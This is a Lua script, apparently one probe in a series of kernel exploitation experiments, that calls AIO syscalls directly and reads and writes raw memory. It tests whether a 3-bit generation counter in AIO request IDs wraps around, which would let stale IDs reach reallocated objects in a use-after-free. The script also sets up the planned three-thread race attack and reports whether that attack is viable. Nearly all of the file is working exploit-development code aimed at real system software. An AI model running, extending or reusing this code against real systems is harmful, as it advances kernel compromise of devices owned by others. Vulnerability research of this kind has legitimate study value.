-- CRASH_CLASS: HIGH
-- PROBE 69g: 3-thread UAF via generation counter wrap
--
-- 71a proved AIO IDs are generation-checked: generation[15:13] | slot[12:0].
-- 3-bit generation (0-7) increments on each slot reuse.
-- After 8 cycles (submit+poll+delete), the generation wraps to 0 and
-- the original ID should match the slot again.
--
-- Attack:
--   1. Cycle each slot 8 times to wrap generation
--   2. Thread A: 662 delete (frees R/I/Q)
--   3. Thread C: 669 submit (reclaims freed slots)
--   4. Thread B: 662 delete with round-0 IDs (gen wrapped → should match)
--
-- First: test whether generation actually wraps and whether wrapped IDs work.

print("=== PROBE 69g: 3-THREAD GEN WRAP UAF ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

local pid = N(mk(20)())
print("pid=" .. pid)
local function alive() return N(mk(20)()) == pid end

-- Ignore SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), uint64(N(sa_buf)), uint64(0)) end)

-- Open /dev/zero
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

local data_buf = memory.alloc(256)
local result_buf = memory.alloc(64)

local function aio_submit(fd)
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd))
    local id_out = memory.alloc(8); wd(N(id_out), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(id_out)))
    end)
    return rd(N(id_out)) or 0
end

local function aio_poll(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(664)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_status(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(666)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_delete(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(662)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

-- ============================================================
-- [A] Generation counter observation
-- Submit + poll + delete repeatedly on same slot, track ID changes
-- ============================================================
print("[A] Generation counter cycling")
print("Tracking ID evolution across 12 cycles on a single slot:")

local all_ids = {}
for cycle = 0, 11 do
    if not alive() then print("DEAD at cycle " .. cycle); return end
    local aid = aio_submit(fd_zero)
    if aid == 0 then
        print(string.format("  cycle %d: submit FAILED", cycle))
        break
    end
    local slot = aid % 8192  -- low 13 bits
    local gen = math.floor(aid / 8192)  -- high 3 bits (bits 15:13)
    all_ids[#all_ids + 1] = aid
    aio_poll(aid)
    local del_st = aio_delete(aid)
    print(string.format("  cycle %2d: id=0x%04X slot=%d gen=%d del=0x%08X",
        cycle, aid, slot, gen, del_st or 0))
end
print("")

-- ============================================================
-- [B] Test if old IDs match after wrap
-- After 8 cycles, try status/poll/delete with round-0 ID
-- ============================================================
print("[B] Old ID reuse after generation wrap")
if #all_ids >= 9 then
    local old_id = all_ids[1]  -- round 0
    local old_slot = old_id % 8192
    local old_gen = math.floor(old_id / 8192)

    -- Submit a new request (should be cycle 12, gen should match round 0 if wrap at 8)
    local new_id = aio_submit(fd_zero)
    local new_slot = new_id % 8192
    local new_gen = math.floor(new_id / 8192)
    print(string.format("  old_id=0x%04X (slot=%d gen=%d)", old_id, old_slot, old_gen))
    print(string.format("  new_id=0x%04X (slot=%d gen=%d)", new_id, new_slot, new_gen))

    if old_id == new_id then
        print("  *** GENERATION WRAPPED — OLD ID MATCHES NEW ***")
    elseif old_slot == new_slot and old_gen == new_gen then
        print("  *** SAME SLOT + SAME GEN — WRAP CONFIRMED ***")
    elseif old_slot == new_slot then
        print("  Same slot, different gen — need more cycles")
    else
        print("  Different slot — LIFO returned a different slot")
    end

    -- Try using old_id on the new object
    aio_poll(new_id)
    local st_new = aio_status(new_id)
    local st_old = aio_status(old_id)
    print(string.format("  status(new_id)=0x%08X status(old_id)=0x%08X",
        st_new or 0, st_old or 0))

    if (st_old or 0) ~= 0x80020003 then
        print("  *** OLD ID ACCEPTED — CROSS-GENERATION ACCESS ***")
    else
        print("  Old ID rejected (0x80020003) — generation check holds even after wrap")
    end
    aio_delete(new_id)
else
    print("  Not enough cycles completed")
end
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [C] Wider generation test: cycle 16 times, check every old ID
-- ============================================================
print("[C] Extended generation cycling (16 cycles)")
local ext_ids = {}
for cycle = 0, 15 do
    if not alive() then print("DEAD at cycle " .. cycle); return end
    local aid = aio_submit(fd_zero)
    if aid == 0 then break end
    ext_ids[#ext_ids + 1] = aid
    aio_poll(aid)
    aio_delete(aid)
end

-- Now submit one more and check all old IDs against it
local final_id = aio_submit(fd_zero)
if final_id ~= 0 then
    aio_poll(final_id)
    local final_slot = final_id % 8192
    local final_gen = math.floor(final_id / 8192)
    print(string.format("  final_id=0x%04X (slot=%d gen=%d)", final_id, final_slot, final_gen))

    local matches = 0
    for i, oid in ipairs(ext_ids) do
        local st = aio_status(oid)
        if st ~= nil and st ~= 0x80020003 then
            local os = oid % 8192
            local og = math.floor(oid / 8192)
            print(string.format("  *** MATCH: cycle %d id=0x%04X (slot=%d gen=%d) status=0x%08X",
                i - 1, oid, os, og, st))
            matches = matches + 1
        end
    end
    if matches == 0 then
        print("  No old IDs accepted — generation check survives wrap")
    else
        print(string.format("  %d old IDs accepted after wrap!", matches))
    end
    aio_delete(final_id)
end
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [D] Multi-slot cycling: 4 slots × 10 cycles
-- Track generation bits precisely
-- ============================================================
print("[D] Multi-slot generation tracking (4 slots × 10 cycles)")
local slot_history = {}
for cycle = 0, 9 do
    if not alive() then print("DEAD"); return end
    local ids = {}
    for s = 1, 4 do
        local aid = aio_submit(fd_zero)
        ids[s] = aid
        if not slot_history[aid % 8192] then slot_history[aid % 8192] = {} end
        local sh = slot_history[aid % 8192]
        sh[#sh + 1] = { cycle = cycle, id = aid, gen = math.floor(aid / 8192) }
    end
    for s = 1, 4 do
        if ids[s] ~= 0 then aio_poll(ids[s]) end
    end
    for s = 1, 4 do
        if ids[s] ~= 0 then aio_delete(ids[s]) end
    end
end

for slot, history in pairs(slot_history) do
    local gens = {}
    for _, h in ipairs(history) do gens[#gens + 1] = h.gen end
    print(string.format("  slot %d: gens=[%s] (%d uses)",
        slot, table.concat(gens, ","), #history))
end
print("")

-- ============================================================
-- [E] If generation wraps (section C found matches), attempt
-- the actual 3-thread attack. Otherwise just report.
-- ============================================================
print("[E] Assessment")
-- Check if any ID collision was found
local collision = false
if #ext_ids >= 8 then
    -- Submit again and check round-0 ID
    local test_id = aio_submit(fd_zero)
    if test_id ~= 0 then
        aio_poll(test_id)
        for _, oid in ipairs(ext_ids) do
            if oid == test_id then
                collision = true
                break
            end
        end
        if not collision then
            -- Also check if old IDs still work
            for _, oid in ipairs(ext_ids) do
                local st = aio_status(oid)
                if st ~= nil and st ~= 0x80020003 then
                    collision = true
                    break
                end
            end
        end
        aio_delete(test_id)
    end
end

if collision then
    print("  *** GENERATION WRAP EXPLOITABLE — old IDs can access new objects ***")
    print("  3-thread attack is viable: cycle gen, then race delete vs submit")
else
    print("  Generation check survives cycling — old IDs always rejected")
    print("  The 3-bit counter may use a wider field, or IDs are not reissued")
    print("  3-thread gen-wrap attack is NOT viable")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69g COMPLETE ===")
